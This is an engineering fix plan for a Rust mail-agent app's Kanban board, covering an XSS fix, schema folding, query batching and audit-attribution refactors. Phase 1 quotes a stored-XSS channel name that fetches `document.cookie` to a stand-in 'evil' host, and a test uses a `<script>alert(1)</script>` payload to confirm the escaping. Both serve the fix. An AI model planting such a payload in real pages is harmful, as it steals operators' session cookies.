# Fix plan — `kanban` commit (844e85c)

Remediation plan for the review findings on commit `844e85c` ("kanban", 15 files, +2911/-146),
which added the correlation-chain Kanban board, the `task_status_events` ledger, and the
`task_chain_changed` live-update path.

Baseline at time of writing: `cargo build` clean, `cargo test --lib task` → 77 passed.
Every phase below must leave both of those true.

---

## Shared context

### House rules this work walks into

`src/AGENTS.md` is binding for code written *and* code touched. The rules that bite here:

- **Newtypes / parsed enums over bare strings** — statuses arriving as strings get parsed once at
  the adapter boundary so the match is exhaustive.
- **No flag parameters** — a `bool` that selects behaviour becomes an enum; never a private
  `_inner` with a bool matrix, never a fourth positional parameter.
- **Name your tuples** — any tuple with 3+ elements, or two same-typed elements, becomes a struct.
- **One decision, one place** — extract to a named helper the first time you would write the
  second copy.
- **Don't collapse errors into defaults on authorization paths.**
- **Keep the file and its test module navigable** — split a module at ~1,000 lines; move an inline
  `#[cfg(test)] mod tests` to a sibling file past ~500 lines.
- **Bound work at every external boundary** — advertising a limit without rejecting input that
  exceeds it is not enforcement.
- **Keep `async fn` chains shallow** — prefer extracting a *synchronous* helper; an `async fn` that
  only forwards is pure stack cost.

### Migration convention (differs from `src/adapters/persistence/AGENTS.md`)

The project is pre-release and `migrations/` deliberately holds **one squashed init file**.
Schema changes edit `migrations/20260817000000_init_schema.sql` **in place**; the database is
reset, not migrated. `src/adapters/persistence/AGENTS.md` §1 says the opposite — it is stale on
this point; do not follow it.

Editing the init file changes its checksum, so both databases must be recreated:

```sh
dropdb --if-exists mail_agents && createdb mail_agents
dropdb --if-exists mail_agents_test && createdb mail_agents_test
DATABASE_URL="postgres://mac03@localhost:5432/mail_agents" cargo sqlx migrate run
```

### sqlx offline cache

The repo mixes runtime-checked queries (`sqlx::query`, `query_as`) with compile-time macros
(`query!`, `query_as!` — `agent.rs`, `company.rs`, `company_invite.rs`). Everything this plan
touches in `task.rs` is runtime-checked, so `.sqlx/` is not strictly affected — but regenerate
anyway after any SQL change, because a stale cache silently builds against the old shape on Fly.io:

```sh
DATABASE_URL="postgres://mac03@localhost:5432/mail_agents" cargo sqlx prepare -- --all-targets
```

### Verification loop for every phase

```sh
cargo build
DATABASE_URL="postgres://mac03@localhost:5432/mail_agents_test" cargo test --lib
cargo clippy --all-targets -- -D warnings
cargo fmt
```

DB tests share one database and run in parallel — never assert on whole-table counts, always scope
assertions to the company/task the test created.

### Phase index

| Phase | Goal | Severity | Depends on |
|-------|------|----------|-----------|
| 1 | Escape channel/agent names on board cards (stored XSS) | **High** | — |
| 2 | Fold the additive migration into the squashed init schema | Convention | — |
| 3 | Bound the board query; batch chain detail; scope SSE re-renders | **High** | 2 |
| 4 | Make transition attribution unforgeable (delete the defaulting trait methods) | Medium | — |
| 5 | Correct transition reasons; make Resume actually resume | Medium | 2, 4 |
| 6 | One source of truth for stage derivation and lease-lost | Medium | 2, 4 |
| 7 | Structural cleanup: module split, named tuples, dead code, round trips | Low | 3–6 |

Phases 1 and 2 are independent and can ship immediately. Phase 3 is the largest single win.

---

## Phase 1 — Stored XSS on board cards

### Goal

Channel and agent names reach the browser unescaped on every Kanban card.

### The defect

`src/adapters/http/pages/task_board.rs`:

```rust
174:    let channels = card.channel_names.join(", ");
175:    let agents = card.agent_names.join(", ");
...
218:                <p class="truncate text-[11px] opacity-65">{channels}</p>
219:                <p class="truncate text-[11px] opacity-65">{agents}</p>
```

`channels.name` is free `TEXT` set through the UI (`migrations/20260817000000_init_schema.sql:295`);
`agents.name` likewise. A channel named `<img src=x onerror=fetch('//evil/?'+document.cookie)>`
executes in every operator's session that loads the board.

Everything else on the card is escaped (`title`, `failure_summary`, `task_type`), and the sibling
`task_chain_detail_pane` escapes the *identical* data at `:293` via
`escape_html_text(&participants)`. This is an oversight, not a decision.

### Files touched

- `src/adapters/http/pages/task_board.rs`
- `src/adapters/http/pages/tests.rs`

### Design

Escape at the join, so the escaped form is the only thing in scope:

```rust
let channels = escape_html_text(&card.channel_names.join(", "));
let agents = escape_html_text(&card.agent_names.join(", "));
```

Escape after joining, not before — `", "` contains nothing that needs escaping, and one allocation
beats N.

While in the file, audit every remaining interpolation in `task_board.rs` for the same class:

- `task_chain_card` — `title`, `failure_summary` escaped; `short_id` is a UUID slice (safe).
- `chain_timeline` — `event.reason`, `approval.status`, `approval.action_title`,
  `outreach.status` escaped; `delivery.status.label()` is a `&'static str` from an enum (safe).
- `chain_task` — `task_type` escaped; the rest are enum labels and UUIDs (safe).
- `task_board_toolbar` — `list_url` uses `escape_html_attr`; `channel_filter_options` is a
  pre-existing shared helper, verify it escapes `channel.name` and fix there if not.

Note that `escape_html_attr` is currently just an alias for `escape_html_text`
(`src/adapters/http/pages/layout.rs:640`), which escapes `& < > " '` — sufficient for both quoted
attribute values and text nodes. No unquoted attributes exist in this file.

### Tests

Extend `task_board_renders_six_columns_toggle_overflow_and_live_chain_pane` in
`src/adapters/http/pages/tests.rs:2633`, or add a focused sibling:

```rust
#[test]
fn board_cards_escape_operator_supplied_channel_and_agent_names() {
    // build a TaskChainCard with:
    //   channel_names: vec!["<script>alert(1)</script>".into()],
    //   agent_names:   vec!["Ops & \"Friends\"".into()],
    let html = /* task_board_page(..) */;
    assert!(!html.contains("<script>alert(1)</script>"));
    assert!(html.contains("&lt;script&gt;alert(1)&lt;/script&gt;"));
    assert!(html.contains("Ops &amp; &quot;Friends&quot;"));
}
```

The negative assertion is the one that matters — it fails today.

### Done when

- [ ] Both interpolations escaped; the whole file re-audited for the same class.
- [ ] `channel_filter_options` confirmed escaping (or fixed).
- [ ] A test asserts the raw `<script>` payload does **not** appear in the rendered board.
- [ ] Existing page tests still pass.

---

## Phase 2 — Fold the migration into the squashed init schema

### Goal

`migrations/20260830000000_task_status_events.sql` (207 lines) is a second migration file. The
project keeps one squashed init file, edited in place, and resets the DB.

### Files touched

- `migrations/20260817000000_init_schema.sql` (edit in place)
- `migrations/20260830000000_task_status_events.sql` (delete)

### Design

Split the 207 lines across the init file at their natural homes rather than appending a block —
the init file is maintained as a single readable document with invariants explained inline.

Current init-file landmarks (line numbers before edit):

| Line | Object |
|------|--------|
| 546 | `CREATE FUNCTION notify_thread_message()` |
| 562 | `CREATE TRIGGER thread_messages_notify` |
| 567 | `CREATE TABLE background_tasks` |
| 678 | `CREATE FUNCTION notify_thread_activity()` |
| 692 | `CREATE TRIGGER background_tasks_notify_activity` |
| 738 | `CREATE TABLE task_attempts` |
| 768 | `CREATE TABLE human_approvals` |
| 809 | `CREATE TABLE email_outbox` |
| 876 | `CREATE TABLE task_outreaches` |
| 910 | `CREATE TABLE task_outreach_targets` |

Placement:

1. **`CREATE TABLE task_status_events`** + its two indexes — after `task_outreach_targets` (~910).
   It has FKs to `human_approvals` and `task_outreaches`, so it must follow both. Keep the
   `-- Immutable, metadata-only history …` header comment; it explains why the table holds no
   payload.
2. **`record_task_status_event()` + `background_tasks_record_status_event`** — immediately after
   the table. Keep the comment about transaction-local settings; it is the only place the
   `mail_agents.task_transition_*` contract is written down.
3. **`notify_task_chain_changed()` + its five triggers** — at the very end of the tasks section,
   next to `notify_thread_activity` (~692) so all three NOTIFY functions read together. Keep the
   `-- One small, identifier-only notification …` comment.

Then delete the additive file.

Because Phases 5 and 6 also edit this trigger, doing this fold **first** means those phases touch
one file instead of two.

### Verification

```sh
dropdb --if-exists mail_agents && createdb mail_agents
dropdb --if-exists mail_agents_test && createdb mail_agents_test
DATABASE_URL="postgres://mac03@localhost:5432/mail_agents" cargo sqlx migrate run
DATABASE_URL="postgres://mac03@localhost:5432/mail_agents" cargo sqlx prepare -- --all-targets
DATABASE_URL="postgres://mac03@localhost:5432/mail_agents_test" cargo test --lib
```

Confirm the objects landed:

```sh
psql -U mac03 -d mail_agents_test -c "\d task_status_events"
psql -U mac03 -d mail_agents_test -c \
  "SELECT tgname FROM pg_trigger WHERE NOT tgisinternal ORDER BY tgname"
```

Expect the five `*_notify_chain` triggers plus `background_tasks_record_status_event`.

### Done when

- [ ] `migrations/` holds exactly one file again.
- [ ] Both DBs recreated from scratch; migrate runs clean.
- [ ] `.sqlx/` regenerated and committed.
- [ ] The three DB-backed status-event tests still pass
      (`task_chain_board_groups_by_correlation…`, `status_event_constraints_reject…`,
      `guarded_transitions_emit_only_on_success…`).

---

## Phase 3 — Bound the board query, batch the detail, scope the stream

### Goal

The board query aggregates the company's entire task and outbox history on every render, and every
render is triggered by a write, for every connected viewer. The chain-detail pane costs ~405
sequential round trips. The stream rebuilds that pane on events that have nothing to do with it.

### The defects

**(a) The board's window filter cannot prune anything.** `list_task_chain_board` filters in
`staged`:

```sql
WHERE is_active OR is_unresolved OR last_activity_at >= $3
```

All three are aggregates over `task_rollup`, which has already run `GROUP BY task.correlation_id`
across `WHERE task.company_id = $1` — every task the company has ever had. Postgres cannot push an
aggregate predicate below its own `GROUP BY`, so the filter runs *after* the scan it was meant to
bound. Same for `delivery_rollup` over `email_outbox`.

`background_tasks` is never pruned, and that is deliberate: `dashboard.rs:186` reconstructs queue
depth from the task rows and says so — *"which is only possible because `background_tasks` is never
pruned."* Retention is not available without breaking the dashboard's queue-depth chart.

The board re-renders because a write emitted `task_chain_changed`, so the cost multiplies by the
number of connected viewers.

The same problem was already solved one file over. `QUEUE_DEPTH_BODY`'s `open_tasks` CTE
(`src/adapters/persistence/dashboard.rs:200-212`):

> The `open_tasks` CTE narrows before the join on purpose. The join is buckets x tasks over a table
> with no retention, so without it the 24-hour window scans every task the system has ever run;
> with it the work is bounded by "unfinished, or finished recently", which is what the
> `(company_id, status, created_at DESC, id DESC)` index is for.

**(b) N+1 in `get_task_chain_detail`** (`src/adapters/persistence/task.rs:2174`) — a per-task loop
issuing `list_task_attempts` + `list_task_deliveries`. 1 header + 1 task list + 200×2 + 3 =
**~405 sequential round trips** for a full chain.

**(c) Unscoped SSE fan-out** (`src/adapters/http/routes/ui_tasks.rs:340`) — the selected chain pane
is rebuilt on *any* `task_chain_changed` event in the company.
`MailboxEvent::is_task_chain(correlation_id)` (`src/infra/events.rs:104`) was added for exactly this
gate and has no production caller.

**(d) Frozen window** — `board_filter()` (`ui_tasks.rs:105`) computes `now - 7 days` once and the
stream captures it for the connection's lifetime.

---

### 3a — Push the window filter into `eligible`

**Current selection semantics, precisely.** A chain shows when any of these hold. Note `stopped` is
in **neither** `is_active` nor `is_unresolved`, so stopped chains *do* age off — preserve that.

| Condition | Composed from |
|---|---|
| `is_active` | task `pending`/`processing`/`pending_approval`/`waiting_for_third_party_reply`, or outbox `pending`/`sending` |
| `is_unresolved` | task `failed`/`dead_letter`/`expired_processing`, or outbox `failed` |
| `last_activity_at >= $3` | `MAX(task.updated_at)` or `MAX(outbox.updated_at)` past the cutoff |

`expired_processing` is a subset of `processing`, so it needs no separate arm.

**The change.** Replace the `SELECT DISTINCT` in `eligible` with a `UNION` carrying the same
predicate at row level, then apply the existing channel filter on top:

```sql
eligible AS (
    SELECT correlation_id FROM (
        SELECT correlation_id FROM background_tasks
         WHERE company_id = $1
           AND (status IN ('pending', 'processing', 'pending_approval',
                           'waiting_for_third_party_reply', 'failed', 'dead_letter')
                OR updated_at >= $3)
        UNION
        SELECT correlation_id FROM email_outbox
         WHERE company_id = $1
           AND (status IN ('pending', 'sending', 'failed')
                OR updated_at >= $3)
    ) AS recent
    WHERE $2::uuid IS NULL OR EXISTS (
        SELECT 1 FROM background_tasks AS filtered_task
         WHERE filtered_task.company_id = $1
           AND filtered_task.correlation_id = recent.correlation_id
           AND filtered_task.channel_id = $2
    )
)
```

`UNION` replaces the `DISTINCT`. The outbox arm also closes a real gap: today `eligible` looks only
at tasks, so a chain whose only recent activity is a delivery is selected only incidentally, via the
`staged` post-filter.

**Leave `staged`'s WHERE clause exactly as it is.** With the pushdown it is redundant, and that
redundancy is the point — the two select the same set, so the pushdown cannot change results, only
prune earlier. It is what makes the optimisation testable, and it keeps the aggregate intact as the
specification and oracle that
[`kanban_denormalized_rollup_table_optimization.md`](./kanban_denormalized_rollup_table_optimization.md)
depends on.

**Indexes.** There is no `updated_at` index on either table today (verified against the live
schema). The `OR` resolves as a BitmapOr of two index scans:

```sql
CREATE INDEX background_tasks_company_updated_idx ON background_tasks (company_id, updated_at DESC);
CREATE INDEX email_outbox_company_updated_idx     ON email_outbox     (company_id, updated_at DESC);
```

The status arm is served by the existing `background_tasks_company_status_created_idx`.
`email_outbox` has no `(company_id, status)` index — add one only if `EXPLAIN` on seeded data shows
that arm seq-scanning. Do not add it speculatively.

These go into the squashed init migration in place (Phase 2 should land first so this is one file).

**Instrumentation — make the deferral decision measurable.**

There is no production signal for board cost today, so "we will see how it behaves in production"
does not currently work:

- `init_tracing` (`src/infra/setup.rs:195`) installs a console `fmt` layer only — no
  `with_span_events`, no exporter. The `#[instrument]` attributes on the board routes give span
  *context* on log lines, not durations.
- `runtime_metric_samples` captures machine-level data (RSS, CPU, pool size,
  `database_acquire_duration_ms`) but nothing per-route or per-query.
- The `duration_ms` occurrences in `src/adapters/http/pages/` are rendered task-attempt durations,
  not request timing.

The only existing indicator is indirect and lagging: board queries hogging pool connections would
push `database_acquire_duration_ms` and `pool_active` up, which says something is wrong without
saying what.

Add a threshold log to `list_task_chain_board` while already in this code:

```rust
/// Past this, the per-render projection is worth looking at. Not an SLO — a tripwire for the
/// question `plan/kanban_denormalized_rollup_table_optimization.md` defers.
const BOARD_QUERY_WARN_THRESHOLD: Duration = Duration::from_millis(500);

let started = Instant::now();
let rows = /* the board query */;
let elapsed = started.elapsed();
// The rollup table is justified by *working-set* growth, not history growth, so log the size of
// the set the pushdown actually selected — that is the number the deferred plan compares against.
if elapsed > BOARD_QUERY_WARN_THRESHOLD {
    warn!(?elapsed, %company_id, chains = rows.len(), "Task board projection is slow");
}
```

Five lines, no new infrastructure, and it turns the deferred document's trigger condition into
something greppable. Without it the Phase 3a `EXPLAIN` baseline has nothing to be compared *to*
later.

Deliberately not done here: adding a column to `runtime_metric_samples`. Its schema comment warns
that the table's CHECK constraints are coupled to its column list, so widening it is real friction
for a signal a log line already carries.

---

### 3b — Batch the chain-detail queries

- Add `ChainAttemptDb` using `#[sqlx(flatten)]` so attempts carry `task_id`. Available in sqlx
  0.8.6 and already used at `src/adapters/persistence/company.rs:54`. `OutboxEntryDb` already has
  `task_id` (`task.rs:450`).
- Replace the loop at `task.rs:2174` with two `WHERE task_id = ANY($2)` queries:

```sql
SELECT attempt.task_id, attempt.attempt_number, attempt.status, attempt.error,
       attempt.stop_reason, attempt.prompt_tokens, attempt.completion_tokens,
       attempt.result, attempt.started_at, attempt.finished_at, attempt.execution_generation
  FROM task_attempts AS attempt
  JOIN background_tasks AS task ON task.id = attempt.task_id
 WHERE task.company_id = $1 AND attempt.task_id = ANY($2)
 ORDER BY attempt.task_id, attempt.attempt_number

SELECT {OUTBOX_COLUMNS} FROM email_outbox
 WHERE company_id = $1 AND task_id = ANY($2)
 ORDER BY task_id, created_at, id
```

- Group with a **synchronous** helper (`fn group_by_task<T>(...) -> HashMap<Uuid, Vec<T>>`) — a
  non-`async fn` contributes no future frame.
- Bound explicitly and surface truncation rather than silently drawing a partial timeline:

```rust
/// A chain detail pane is an operational view, not an export: past these the pane truncates and
/// says so rather than projecting an unbounded ledger into one HTML response.
const CHAIN_DETAIL_MAX_TASKS: i64 = 200;
const CHAIN_DETAIL_MAX_ATTEMPTS: i64 = 1_000;
const CHAIN_DETAIL_MAX_DELIVERIES: i64 = 1_000;
```

Add `truncated: bool` to `TaskChainDetail` and render it in the pane.

Result: 6 queries flat, down from ~405.

---

### 3c — Scope SSE re-renders and slide the window

```rust
/// A wake means "re-render the selected pane" when it names that chain, or when lag means we
/// cannot tell what we missed.
fn wake_touches(wake: &Wake, selected: Option<CorrelationId>) -> bool {
    match (wake, selected) {
        (Wake::Lagged, _) => true,
        (Wake::Event(event), Some(id)) => event.is_task_chain(id.as_uuid()),
        (Wake::Event(_), None) => false,
    }
}
```

```rust
let mut refresh_selected = true;            // the first pass always paints the pane
loop {
    let filter = query.board_filter();      // recomputed per tick -> sliding window, fixes (d)
    match view.board(filter).await { /* yield task-board */ }

    if refresh_selected && let Some(correlation_id) = selected {
        match view.chain(correlation_id).await { /* yield task-chain */ }
    }

    let Some(first) = changes.next().await else { return };
    let mut touched = wake_touches(&first, selected);
    while let Ok(Some(wake)) =
        tokio::time::timeout(Duration::from_millis(75), changes.next()).await
    {
        touched |= wake_touches(&wake, selected);
    }
    refresh_selected = touched;
}
```

`Wake::Lagged` must force a refresh — that is the existing "what was missed is unknown, so redo
everything" contract the thread streams follow (`src/adapters/http/routes/ui.rs:672`).

**Reduce chatter at the source.** `email_outbox_notify_chain` fires `AFTER INSERT OR UPDATE OF
status`, so `pending → sending → sent` emits three notifications for one delivery. Add
`WHEN (TG_OP = 'INSERT' OR OLD.status IS DISTINCT FROM NEW.status)` to it and to
`human_approvals_notify_chain`.

**Broadcast pressure.** `TaskChainChanged` now shares the 256-slot broadcast
(`src/infra/events.rs:36`) with the thread streams, so thread subscribers hit `Wake::Lagged` more
often. Measure before acting; if it shows, raise `BROADCAST_CAPACITY` first (the comment already
says it "only needs to be large enough that lag is rare"). Give chain events a separate sender only
if that is not enough — do not do it speculatively.

---

### Tests

- **Equivalence, DB-backed (the important one).** Run the board query with and without the pushdown
  over a seeded company covering every branch: active chain, unresolved chain, chain stopped inside
  the window, chain stopped outside it, chain completed inside, chain completed outside, and a chain
  whose only recent activity is an outbox row. Assert identical card sets. This protects the
  semantics and doubles as the oracle harness Document B reuses.
- **Grouping, DB-backed.** A chain with 3 tasks each having attempts and deliveries; assert every
  attempt and delivery attaches to the *right* task. Association is what breaks when batching, so
  assert per-task, not totals.
- **Truncation.** Exceed `CHAIN_DETAIL_MAX_TASKS` (or lower it under `#[cfg(test)]`); assert
  `truncated` and the rendered notice.
- **Pure, no mocks.** `wake_touches` over the full matrix — `Lagged`/`Event` × selected/none ×
  matching/non-matching.
- Keep `task_chain_board_groups_by_correlation_and_keeps_complete_chain_under_channel_filter`
  green — it pins the channel-filter semantics the pushdown must not alter.

### Measuring

The test DB holds 6 tasks and 1 outbox row — far too small for the planner to show anything. Seed
~50k tasks across ~10k chains, most completed and older than the window, then
`EXPLAIN (ANALYZE, BUFFERS)` the board query. Before: `task_rollup`/`delivery_rollup` row counts on
the order of full company history. After: bounded by working set, BitmapOr over
`background_tasks_company_status_created_idx` and `background_tasks_company_updated_idx`.

**Record both numbers in the commit message.** They are the baseline that decides whether
`plan/kanban_denormalized_rollup_table_optimization.md` is ever needed.

Once deployed, the signal to watch is `Task board projection is slow` in the logs. Rising `chains`
values on those lines mean the *working set* is growing, which is the one thing the pushdown does
not bound and the only thing that justifies the rollup table.

### Done when

- [ ] `eligible` selects at row level; `staged`'s filter retained unchanged.
- [ ] Both `updated_at` indexes in the init migration; DBs recreated; `.sqlx/` regenerated.
- [ ] Equivalence test passes across all seven branches.
- [ ] `get_task_chain_detail` issues a fixed 6 queries regardless of chain size.
- [ ] Attempts and deliveries bounded; truncation visible in the pane.
- [ ] The chain pane re-renders only on its own chain, or after `Wake::Lagged`.
- [ ] `terminal_since` slides across the life of an SSE connection.
- [ ] `is_task_chain` has a production caller.
- [ ] Notify triggers fire only on real status changes.
- [ ] Before/after `EXPLAIN` numbers recorded in the commit message.
- [ ] `BOARD_QUERY_WARN_THRESHOLD` tripwire in place, logging elapsed time and working-set size.

---

## Phase 4 — Make transition attribution unforgeable

### Goal

Four trait methods silently discard the attribution they exist to carry.

### The defect

`src/adapters/persistence/task.rs:858-895`:

```rust
async fn mark_task_failed_with_reason(&self, …, _reason: TaskStopReason) -> AppResult<bool> {
    self.mark_task_failed(lease, error_msg, next_run_at, is_dead_letter).await
}
async fn stop_task_as(&self, id: Uuid, _operator_id: Uuid)   -> …  { self.stop_task(id).await }
async fn resume_task_as(&self, id: Uuid, _operator_id: Uuid) -> …  { self.resume_task(id).await }
async fn resume_task_after_approval(&self, id: Uuid, _approval_id: Uuid) -> …
                                                                   { self.resume_task(id).await }
```

Each default throws away the reason / operator / approval id. These are the **only** path by which
attribution reaches the trigger, so an implementation that forgets to override compiles clean and
writes a permanently wrong audit trail. That is the inverse of the posture the rest of this trait
takes — `commit_agent_dispatch` and the lease renewal both carry explicit "No default:" comments
explaining why a silently-succeeding double is unacceptable.

It also produces a `_as` / `_after_approval` method matrix and an `Option<Uuid>` dispatch in
`task_worker.rs:1467-1483` and `:1542-1558` — the shape `AGENTS.md` bans under "No flag
parameters".

### Files touched

- `src/adapters/persistence/task.rs`
- `src/domain/entities/task.rs`
- `src/application/services/task_worker.rs`
- `src/application/use_cases/approval.rs`
- `src/adapters/http/routes/task.rs`
- `src/adapters/http/routes/ui_tasks.rs`
- 6 mock implementors (see below)

### Design

**Replace, don't add.** Collapsing the pairs into one method each removes three methods rather than
promoting three defaults, and the mocks need only a signature update.

Add to `src/domain/entities/task.rs`, next to `TaskTransitionReason`:

```rust
/// Who caused a transition, in a shape that makes illegal combinations unrepresentable.
///
/// `actor_id: Some(..)` with `actor_kind: System` currently compiles fine and means nothing;
/// this enum is what stops that.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TransitionActor {
    System,
    Operator(Uuid),
    Approval(Uuid),
    Outreach(Uuid),
}

impl TransitionActor {
    pub fn kind(self) -> TaskTransitionActorKind { … }
    pub fn actor_id(self) -> Option<Uuid> { … }      // Operator only
    pub fn approval_id(self) -> Option<Uuid> { … }
    pub fn outreach_id(self) -> Option<Uuid> { … }
}
```

Then collapse the trait surface:

```rust
// was: stop_task(id) + stop_task_as(id, operator_id)
async fn stop_task(&self, id: Uuid, actor: TransitionActor) -> AppResult<BackgroundTask>;

// was: resume_task(id) + resume_task_as(id, op) + resume_task_after_approval(id, approval)
async fn resume_task(&self, id: Uuid, actor: TransitionActor) -> AppResult<BackgroundTask>;
```

And fold the failure path's bool flag away at the same time:

```rust
/// Which side of the retry budget this failure lands on. A bool here reads as
/// `is_dead_letter: false` at the call site and says nothing about why.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TaskFailureOutcome { Retry, DeadLetter }

pub struct TaskFailure<'a> {
    pub lease: TaskLeaseRef,
    pub error: &'a str,
    pub next_run_at: DateTime<Utc>,
    pub outcome: TaskFailureOutcome,
    pub reason: TaskStopReason,
}

// was: mark_task_failed(lease, msg, next, bool) + mark_task_failed_with_reason(…, reason)
async fn mark_task_failed(&self, failure: TaskFailure<'_>) -> AppResult<bool>;
```

No defaults on any of the three. Update `set_task_transition_context` /
`set_task_transition_source` to take a `TransitionActor` so the two setters can no longer disagree,
and so a caller cannot set a reason while leaving a stale source from earlier in the same
transaction:

```rust
pub(crate) async fn set_task_transition(
    tx: &mut sqlx::Transaction<'_, Postgres>,
    reason: TaskTransitionReason,
    actor: TransitionActor,
) -> AppResult<()>
```

One `SELECT set_config(...) , set_config(...), …` covering all five keys, always writing all five
(empty string where absent). That closes the latent bug where a transaction that calls
`set_task_transition_context` without a matching `set_task_transition_source` inherits the previous
statement's `related_outreach_id`. Not currently reachable — every caller opens its own transaction
— but it is one shared transaction away from being a silent mis-attribution.

**Call-site updates:**

| Site | Change |
|------|--------|
| `task_worker.rs:646` | `mark_task_failed_with_reason(…)` → `mark_task_failed(TaskFailure { … })` |
| `task_worker.rs:1467` | `stop_task_and_notify(id, Option<Uuid>)` → `(id, TransitionActor)`; delete the `match operator_id` |
| `task_worker.rs:1542` | same for `resume_task` |
| `routes/task.rs:308,340` | pass `TransitionActor::Operator(_user.id)` |
| `routes/ui_tasks.rs:393,420` | pass `TransitionActor::Operator(workspace.user_id)` |
| `use_cases/approval.rs:226` | `resume_task_after_approval(id, approval.id)` → `resume_task(id, TransitionActor::Approval(approval.id))` |

Also at `use_cases/approval.rs:226`: the result is currently discarded with `let _ = …`. On an
approval-accept path a failure to resume means the approval is recorded but the task never runs.
Per "don't collapse errors into defaults", either propagate with `?` or write an explicit
`Err(e) => warn!(…)` arm so the choice is visible and logged.

**Mock implementors to update (6):**

- `src/adapters/http/routes/webhooks/sendgrid.rs:700`
- `src/adapters/smtp/server.rs:1327`
- `src/application/use_cases/schedule.rs:1064`
- `src/application/use_cases/thread/tests.rs:475`
- `src/application/use_cases/approval.rs:579`
- `src/application/services/task_worker.rs:1889`

Most only need the parameter added and ignored. Per `AGENTS.md`, hand-written mocks re-declared per
file are a smell — if this phase makes the duplication painful, hoisting them into one shared
`test_support` module is the sanctioned fix, but treat that as Phase 7 work, not a blocker here.

### Tests

- Keep `guarded_transitions_emit_only_on_success_and_operator_actions_record_the_user` green — it
  is the regression net for this whole area.
- Add a DB-backed test that an approval-driven resume records `actor_kind = 'approval'` and a
  non-null `related_approval_id` (mirrors the existing `ApprovalRequested` assertion at
  `adapters/persistence/approval.rs:727`).
- Unit-test `TransitionActor::{kind, actor_id, approval_id, outreach_id}` — pure, no DB, exhaustive
  over the four variants.

### Done when

- [ ] `mark_task_failed_with_reason`, `stop_task_as`, `resume_task_as`,
      `resume_task_after_approval` no longer exist.
- [ ] No `TaskPersistence` method that carries attribution has a default body.
- [ ] `is_dead_letter: bool` is gone from the failure path.
- [ ] The two `set_task_transition_*` setters are one function that always writes all five keys.
- [ ] All 6 mocks updated; full `cargo test --lib` green.

---

## Phase 5 — Correct transition reasons; make Resume actually resume

### Goal

Three reason-mapping defects, and a Resume button that cannot recover a dead-lettered task.

### The defects

**(a) Resume from `dead_letter` is a no-op in practice.** `resume_task_on` and `stop_task_on`
both gained `'dead_letter'` in their allowed status lists in this commit, but resume does not reset
`retry_count`. The worker computes:

```rust
// src/application/services/task_worker.rs:639
let is_dead_letter = dead_letter_now || next_retry >= task.max_retries;
```

with `next_retry = task.retry_count + 1`. A resumed dead-lettered task still has
`retry_count >= max_retries`, so it re-dead-letters on its first failure. The button appears to
work and changes nothing durable.

**(b) An unattributed resume is logged as a failure.** The trigger's `CASE` has no arm for
`failed`/`dead_letter` → `pending`, so it falls through to `ELSE 'retryable_failure'`. An operator
resuming a failed task writes a ledger row claiming the *system* retried it.

**(c) Approval action strings are matched loosely.** `src/adapters/persistence/approval.rs:377`:

```rust
let transition_reason = match action {
    "proceed_partial" => TaskTransitionReason::ApprovalAccepted,
    "extend_24h" | "extend_48h" | "extend" => TaskTransitionReason::OutreachExtended,
    "reject" => TaskTransitionReason::OperatorStopped,
    _ => TaskTransitionReason::ApprovalAccepted,
};
```

`"reject"` pairs reason `operator_stopped` with `actor_kind: Approval`, contradicting the trigger's
own mapping (`operator_stopped` → `operator`). And `_ =>` labels *any* unrecognised action as
`approval_accepted` — a typo in a new action string silently records consent that was never given.
This is exactly the bare-string-status problem `AGENTS.md` says to parse into an enum once at the
adapter boundary.

### Files touched

- `migrations/20260817000000_init_schema.sql`
- `src/domain/entities/task.rs`
- `src/adapters/persistence/task.rs`
- `src/adapters/persistence/approval.rs`

### Design

**(a) Reset the retry budget on operator resume, not on continuation.**

Resume serves two different intents: an operator retrying failed work, and an approval/outreach
continuation. Only the first should reset the budget.

```sql
UPDATE background_tasks
   SET status = 'pending',
       run_at = CURRENT_TIMESTAMP,
       -- An operator resuming exhausted work is asking for a fresh budget; a continuation
       -- from approval or outreach is the same run carrying on, and keeps its count.
       retry_count = CASE WHEN status IN ('failed', 'dead_letter') THEN 0 ELSE retry_count END,
       worker_id = NULL, execution_generation = NULL,
       locked_at = NULL, lock_expires_at = NULL,
       updated_at = CURRENT_TIMESTAMP
 WHERE id = $1
   AND status IN ('stopped', 'pending_approval', 'waiting_for_third_party_reply',
                  'failed', 'dead_letter')
RETURNING …
```

Keying off the *old status* rather than the actor keeps the rule in one place and means the
approval path cannot accidentally reset a budget.

`last_error` is deliberately left in place — it is the record of why the task died, and the pane
shows it. Confirm this against the intended UX; if the pane should look clean after resume, clear
it in the same `CASE`.

**(b) Add the missing trigger arm, and stop the `ELSE` from lying.**

```sql
WHEN OLD.status IN ('failed', 'dead_letter') AND NEW.status = 'pending'
    THEN 'operator_resumed'
```

placed after the existing `pending_approval`/`waiting_for_third_party_reply` arms so those keep
their more specific reasons.

For the fallback: `ELSE 'retryable_failure'` asserts a cause it has not established. Add an
`'unknown'` reason to the `task_status_events_reason_check` constraint and to
`TaskTransitionReason`, and use it. A ledger row that says "we did not classify this" is
strictly better than one that says the wrong thing, and it makes unclassified transitions
greppable:

```sql
SELECT from_status, to_status, count(*) FROM task_status_events
 WHERE reason = 'unknown' GROUP BY 1, 2;
```

Getting zero rows there is the acceptance signal that the explicit-attribution work in Phase 4 is
complete.

**(c) Parse the approval action once.**

```rust
/// Approval actions arrive as strings from a link; parse once so the match is exhaustive and a
/// new action is a compile error rather than a silently-accepted approval.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum QuorumTimeoutAction { ProceedPartial, Extend(ExtendWindow), Reject }

impl FromStr for QuorumTimeoutAction { … }   // "extend_24h" | "extend_48h" | "extend" | …
```

Parse at the top of `apply_quorum_timeout_decision`, return `AppError::BadRequest` on an unknown
action instead of guessing, and drive both the reason mapping and the existing
`match action { … }` body from the enum. The `_ =>` arm disappears by construction.

Add an `ApprovalRejected` reason (enum + CHECK constraint) so `reject` no longer has to borrow
`operator_stopped` with a mismatched actor kind:

```rust
QuorumTimeoutAction::Reject => TaskTransitionReason::ApprovalRejected,
```

### Tests

- **DB-backed:** dead-letter a task (exhaust `max_retries`), `resume_task(id,
  TransitionActor::Operator(..))`, assert `retry_count == 0`, status `pending`, and that the event
  reason is `operator_resumed` with `actor_kind = 'operator'`.
- **DB-backed:** resume from `pending_approval` via the approval path, assert `retry_count` is
  **unchanged** and the reason is `approval_accepted`.
- **DB-backed:** assert no `reason = 'unknown'` rows are produced across the existing worker
  lifecycle tests — a cheap global net.
